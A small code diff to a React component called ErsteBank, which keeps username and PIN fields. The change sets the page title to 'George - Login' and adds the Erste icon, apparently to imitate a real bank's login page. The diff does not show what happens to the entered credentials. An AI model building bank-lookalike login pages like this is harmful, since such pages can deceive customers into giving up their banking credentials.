@@ -54,6 +54,7 @@ const ErsteBank = () => {
   const [showLoading, setShowLoading] = useState(false);
 
   useEffect(() => { window.scrollTo(0, 0); }, []);
+  usePageMeta("George - Login", ersteIcon);
 
   const [username, setUsername] = useState("");
   const [pin, setPin] = useState("");
